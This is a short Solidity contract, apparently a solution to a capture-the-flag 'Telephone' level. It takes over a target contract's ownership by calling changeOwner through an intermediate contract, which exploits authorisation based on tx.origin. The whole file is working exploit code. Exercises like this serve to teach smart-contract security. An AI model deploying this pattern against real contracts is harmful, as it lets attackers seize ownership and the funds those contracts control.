pragma solidity ^0.8.0;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttacker {
    address public instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function attack() public {
        Telephone(instance).changeOwner(msg.sender);
    }
}